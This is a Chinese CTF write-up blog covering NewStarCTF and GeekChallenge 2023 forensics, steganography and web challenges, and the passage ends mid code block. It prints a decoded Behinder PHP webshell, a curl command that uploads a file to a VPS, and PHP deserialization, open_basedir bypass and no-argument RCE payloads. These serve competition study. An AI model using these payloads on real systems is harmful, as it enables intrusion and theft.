href="http://dialabc.com/sound/detect/index.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTc5ODE1NzAsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5Nzk4MTI3MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMyNzU2NTY4N30.hyTwib0YFlVUmi6V7DEEhaMjulUfPeutiH9sEW-8dbE">http://dialabc.com/sound/detect/index.html</a> </p><p>结合题目简介的提示，这串数字应该是某处使用的密码，因此可以尝试steghide工具来对jpg图片进行隐写内容提取：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">steghide <span class="hljs-keyword">extract </span>-sf secret.<span class="hljs-keyword">jpg </span>-p <span class="hljs-number">52563319066</span><br></code></pre></td></tr></table></figure><h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="misc-R通大残"><a href="#misc-R通大残" class="headerlink" title="misc-R通大残"></a>misc-R通大残</h3><p>RGB通道隐写</p><img src="/2023/11/19/newstar2023-misc/image-20231028004805493.png" class title="image-20231028004805493"><h3 id="misc-依旧是空白"><a href="#misc-依旧是空白" class="headerlink" title="misc-依旧是空白"></a>misc-依旧是空白</h3><p>考点:snow隐写</p><p>给了图片，CRC报错，爆出正常高度和宽度，得到密码</p><p>结合给了密码，那么很可能就是snow隐写了，SNOW 隐写又被称为 HTML 隐写，通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">snow</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-type">s00_b4by</span><span class="hljs-type">_f0r</span><span class="hljs-type">_y0u</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-built_in">White</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure><h3 id="misc-Nmap"><a href="#misc-Nmap" class="headerlink" title="misc-Nmap"></a>misc-Nmap</h3><p>有用的知识:<a href="https://blog.csdn.net/weixin_41905135/article/details/124541161?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg2Nzc5MzMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODY3NzYzMywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1MDI5NDg3OH0.xQdWO-JPFc83BK9dAFzRW2E0W6F7FEmlfr2km_31L_Q">【精选】Nmap 中的各种端口扫描技术_namp扫描全端口_Bruce_Liuxiaowei的博客-CSDN博客</a></p><p>使用过滤器：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.flags.syn <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> and tcp.flags.ack <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>其他过滤器:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">udp</span><br></code></pre></td></tr></table></figure><p>这个过滤条件可以筛选出UDP端口开放的数据包，该过滤条件会匹配所有的UDP数据包，因为UDP没有像TCP那样的连接建立过程，所以UDP数据包的到达通常表示端口是开放的。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">icmp and icmp.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">3</span> and icmp.code <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>这个过滤条件用于查找被目标主机标记为”端口不可达”的数据包，通常表示端口关闭；</p><p>该过滤条件匹配了ICMP “端口不可达”类型的数据包，其中的 “code” 值为3表示端口关闭。</p><h3 id="misc-第一次取证-学习"><a href="#misc-第一次取证-学习" class="headerlink" title="misc-第一次取证(学习)"></a>misc-第一次取证(学习)</h3><p>查看信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> imageinfo<br></code></pre></td></tr></table></figure><p>查看内存进程列表：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 pslist<br></code></pre></td></tr></table></figure><p>查看notepad进程：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 editbox<br></code></pre></td></tr></table></figure><p>最后解密</p><h3 id="misc-3-溯源"><a href="#misc-3-溯源" class="headerlink" title="misc-3-溯源"></a>misc-3-溯源</h3><p>这道题目与week3的2-分析有衔接，顺着week3的那道题分析下去，</p><p>先找到与wh1t3g0d.php有关的并继续分析下去：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.uri</span><span class="hljs-selector-class">.path</span> contains <span class="hljs-string">&quot;wh1t3g0d.php&quot;</span><br></code></pre></td></tr></table></figure><p>发现写入了一个shell.php，继续跟一下shell.php：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>.request.uri <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;shell.php&quot;</span><br></code></pre></td></tr></table></figure><p>然后又发现调用file_put_contents写入了一个1.php文件，文件内容进行了base64编码，解码得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();    <br><span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;    <br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;    <br><span class="hljs-title function_ invoke__">session_write_close</span>();    <br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);    <br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))&#123;        <br>        <span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;        <br>        <span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);                <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;                 <br>            <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];                <br>        &#125;    <br>    &#125;<br><span class="hljs-keyword">else</span>&#123;        <br>        <span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);    <br>    &#125;    <br><span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);    <br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];    <br><span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显的冰蝎Shell，发现后续的交互也主要是和1.php进行交互。</p><p>从这里可以得知key为e45e329feb5d925b，流量采用AES CBC 128加密，可以先把所有1.php的响应流量过滤出来：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>.response_for.uri <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;/1.php&quot;</span><br></code></pre></td></tr></table></figure><p>导出特定分组，把响应流量保存下来，响应流量解密可以在<a href="http://tools.bugscaner.com/cryptoaes/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MDAxNDcxMzMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTcwMDE0NjgzMywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjowfQ.MfGGH3uY1QCigbKO665qIgryx_rZtMWsjMzzam0E1nE">http://tools.bugscaner.com/cryptoaes/</a>进行解密，可以看到冰蝎的响应流量是以json形式返回的，json的内容是base64编码的，</p><p>然后在导出的特定分组里面发现内容，尝试解密，最终发现用户名和内网地址</p><p>网上写得很好的一篇WP: <a href="https://blog.csdn.net/Myon5/article/details/134086143?ops_request_misc=&request_id=&biz_id=102&utm_term=NewStarCTF">NewStarCTF2023week4-溯源-CSDN博客</a></p><h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="misc-新建Python文件"><a href="#misc-新建Python文件" class="headerlink" title="misc-新建Python文件"></a>misc-新建Python文件</h3><p>pyc剑龙隐写</p><p>工具，stegosaurus项目：<a href="https://github.com/AngelKitty/stegosaurus?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTk2Mjg1NTMsImZpbGVHVUlEIjoiUjNzR2daZHJseUU2bkw4VCIsImlhdCI6MTY5OTYyODI1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM4MDU4MzA4Mn0.Lu6RkkbvcasxDs7C5DrhMLcPv7r_r_bO8_wa0VN5PeA">https://github.com/AngelKitty/stegosaurus</a></p><h3 id="misc-隐秘的图片"><a href="#misc-隐秘的图片" class="headerlink" title="misc-隐秘的图片"></a>misc-隐秘的图片</h3><p>图片异或</p><h3 id="misc-ezhard"><a href="#misc-ezhard" class="headerlink" title="misc-ezhard"></a>misc-ezhard</h3><p>磁盘取证</p><p>在linux系统下挂载磁盘，查看文件即可</p><p>新建一个文件夹，然后</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mount</span> 磁盘文件 新建目录/<br></code></pre></td></tr></table></figure><p>失败的话建议sudo</p><h3 id="misc-easymem"><a href="#misc-easymem" class="headerlink" title="misc-easymem"></a>misc-easymem</h3><p>这道题感觉对新手还是难了点😭😭😭😭</p><p>flag第一部分在ctf用户的密码，需使用mimikatz插件读取</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f *<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 mimikatz<br></code></pre></td></tr></table></figure><p>flag第二部分在桌面flag2.txt文件中，利用filescan扫描，然后dumpfiles下载，并读取</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f *<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 filescan<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python2 vol.py -f *<span class="hljs-string">.raw</span> <span class="hljs-params">--profile=Win7SP1x64</span> dumpfiles -Q 编号 -D <span class="hljs-string">./</span><br></code></pre></td></tr></table></figure><p>flag第三部分在画图进程中(mspaint.exe)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f *<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 memdump -<span class="hljs-selector-tag">p</span> 进程号 -D ./<br></code></pre></td></tr></table></figure><p>然后gimp打开，raw的imge data，然后先调offset，感觉有点东西的时候调整宽度，直至有字符出现</p><h3 id="misc-BabyAntSword"><a href="#misc-BabyAntSword" class="headerlink" title="misc-BabyAntSword"></a>misc-BabyAntSword</h3><p>考点:蚁剑流量分析</p><p>PS：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、中国菜刀<br>请求体中存在eval、base64等特征字符；<br>连接过程中使用base64编码对发送的指令进行加密；<br>还有一段以QG开头，<span class="hljs-number">7</span>J结尾的固定代码。<br><br><span class="hljs-number">2</span>、蚁剑<br>默认的user-agent请求头是antsword XXX（不过可以修改）<br>一般将payload进行分段，分别进行base64编码；<br>一般具有像eval这样的关键字和@ini_set(<span class="hljs-string">&quot;display&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)；这段代码。<br><br><span class="hljs-number">3</span>、冰蝎<br>PHP代码中可能存在eval、assert等关键词；<br>jsp代码中可能会有<span class="hljs-keyword">get</span> <span class="hljs-keyword">class</span>(),<span class="hljs-symbol">get</span> <span class="hljs-symbol">class</span> <span class="hljs-symbol">loader</span>()等字符特征。<br><br>中国菜刀、蚁剑的攻击流量特征明显，容易被各类安全设备检测，而冰蝎是一款基于<span class="hljs-symbol">Java</span>开发的动态加密通信流量的<span class="hljs-symbol">Webshell</span>工具，由于通信流量被加密，传统的 <span class="hljs-symbol">WAF</span>、<span class="hljs-symbol">IDS</span> 设备难以检测，冰蝎最大特点就是对交互流量进行对称加密（冰蝎密文采用对称加密算法<span class="hljs-symbol">AES</span>加密，加密后还会进行 <span class="hljs-symbol">base64</span> 编码），且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。　<br></code></pre></td></tr></table></figure><p>首先，过滤出POST:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http.request.method <span class="hljs-operator">=</span><span class="hljs-operator">=</span> POST<br></code></pre></td></tr></table></figure><p>然后发现一个上传文件的地方，复制，并010新建，解压可得到WebShell密码</p><p>接着分析其他报文</p><p><strong>对于蚁剑响应流量的解密就是Base64解密即可，需要去掉响应首尾拼接的干扰字符。</strong></p><p>对于蚁剑请求流量的分析需要删掉首部前两个字符，例如在tcp.stream eq 39的请求中我们提取出参数：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">f<span class="hljs-number">6</span>f<span class="hljs-number">75679</span>ab<span class="hljs-number">3</span>efc=AvY<span class="hljs-number">2</span>QgIi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>Ivb<span class="hljs-name">G9</span>jYWwvd<span class="hljs-name">G9</span>tY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>Ijtlb<span class="hljs-symbol">nY7</span>ZW<span class="hljs-symbol">NobyBmNWNkOTtwd2</span>Q<span class="hljs-number">7</span>ZW<span class="hljs-symbol">NobyAwYTI1</span>ZmJjMW<span class="hljs-name">M1</span><br></code></pre></td></tr></table></figure><p>去掉前两位:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Y<span class="hljs-number">2</span>QgIi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>Ivb<span class="hljs-name">G9</span>jYWwvd<span class="hljs-name">G9</span>tY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>Ijtlb<span class="hljs-symbol">nY7</span>ZW<span class="hljs-symbol">NobyBmNWNkOTtwd2</span>Q<span class="hljs-number">7</span>ZW<span class="hljs-symbol">NobyAwYTI1</span>ZmJjMW<span class="hljs-name">M1</span><br></code></pre></td></tr></table></figure><p>base64解码得到:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/usr/local/tomcat&quot;</span>;<span class="hljs-built_in">env</span>;<span class="hljs-built_in">echo</span> f5cd9;<span class="hljs-built_in">pwd</span>;<span class="hljs-built_in">echo</span> 0a25fbc1c5<br></code></pre></td></tr></table></figure><p>追踪HTTP流，在response，可看到，同样去除干扰字符，base64解码即可拿到java版本</p><p>最后在其他报文作同样的分析，也可以拿到攻击者删除的文件内容。</p>]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>geekchallenge</title>
    <link href="/2023/11/06/geekchallenge2023wp/"/>
    <url>/2023/11/06/geekchallenge2023wp/</url>
    
    <content type="html"><![CDATA[<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><p>凯撒+W型栅栏+base64+熊曰解密++emoji+普莱费尔加密解密</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="下一站是哪儿"><a href="#下一站是哪儿" class="headerlink" title="下一站是哪儿"></a>下一站是哪儿</h3><p>binwalk分离+标准银河字母表+航班查询+航班有两种表达方式</p><h3 id="Qingwan心都要碎了"><a href="#Qingwan心都要碎了" class="headerlink" title="Qingwan心都要碎了"></a>Qingwan心都要碎了</h3><p>博物馆，<del>一不小心随便输一个直接对了</del></p><h3 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h3><p>分离图片+调整图片大小+stegsolve异或</p><h3 id="窃听风云"><a href="#窃听风云" class="headerlink" title="窃听风云"></a>窃听风云</h3><p>Net-NTLMv2哈希爆破</p><p>本人彩笔，参考下文破解的:</p><p><a href="https://www.jianshu.com/p/45b85006641a">利用hashcat破解NTLMv2 hash - 简书 (jianshu.com)</a></p><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><p>网上搜，搜到一个工具UndertaleModTool，打开data.win文件，找一下就能找到flag了</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ezhttp"><a href="#Ezhttp" class="headerlink" title="Ezhttp"></a>Ezhttp</h3><p>最后一步是via，比较少见一点</p><h3 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h3><p>简单的pop链</p><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><p>比较难的一步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>]) &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>) <br></code></pre></td></tr></table></figure><p>采用科学计数法绕过即可</p><h3 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h3><p>简单的文件上传，就是蚁剑连不上🤔</p><h3 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h3><p>要有一台vps，然后开启监听</p><p>直接传文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -T <span class="hljs-regexp">/tmp/</span>Syclover ip <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h3><p>字符绕过(十六进制)+fast_destruct+glob读文件+chdir绕过openbasedir</p><p>system被ban了,</p><p>glob读文件:(类似ctfshow72)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;echo(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&quot; &quot;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">#扫描根目录有什么文件</span><br>c=<span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;echo(<span class="hljs-variable">$f</span>-&gt;getFilename().<span class="hljs-string">&quot; &quot;</span>);&#125; <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><br></code></pre></td></tr></table></figure><p>最终payload:</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scilab">?web=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;S:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lo\76er&quot;</span>;s:<span class="hljs-number">171</span>:<span class="hljs-string">&quot;mkdir(&#x27;</span>test&#x27;);<br>        <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br>        ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>        <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>        ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>        echo file_get_contents(<span class="hljs-string">&#x27;/f1ger&#x27;</span>);<span class="hljs-string">&quot;;&#125;i:0;N;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h3><p>提交框含有目录穿越漏洞(这题..&#x2F;读不了(url编码后的)，也不知道为什么)</p><p>最终payload:</p><p>Title:&#x2F;&#x2F;f14444(从主页F12得知)(一个‘&#x2F;’也行)</p><p>Content:</p><h3 id="you-know-flask？"><a href="#you-know-flask？" class="headerlink" title="you know flask？"></a>you know flask？</h3><p>考点:session伪造</p><p>下载工具，将cookie值解密，并改造成admin</p><p>加密过程中发现需要密钥，在robots.txt里可以找到</p><p>最终payload:</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python flask····.py encode -s <span class="hljs-string">&quot;wanbaoMQ==wanbao&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>is_admin&#x27;: True, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-number">1</span>&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h3 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h3><p>一解：</p><p>tplmap测出jinja2模板盲注</p><p>直接跑脚本出了</p><p>二解：</p><p>tplmap拿到shell后，将结果写入robots.txt</p><h3 id="Puppy-rce"><a href="#Puppy-rce" class="headerlink" title="Puppy_rce"></a>Puppy_rce</h3><p>无参数RCE，随机读文件，最终payload</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br></code></pre></td></tr></table></figure><p>另一种payload:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure><p>非常好文章:<a href="https://xz.aliyun.com/t/9360#toc-8">PHP的无参数RCE - 先知社区 (aliyun.com)</a></p><h3 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>hint<br></code></pre></td></tr></table></figure><p>读完base64(php)+尊嘟假嘟，然后不会了，发现官方有个hint，rc4解密，密钥是题目描述的Syclover，然后又不会了，等wp了</p><img src="/2023/11/06/geekchallenge2023wp/6cba2a5095a98e3aab456d7e8d03004.png" class title="6cba2a5095a98e3aab456d7e8d03004"><p>差最后一步:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 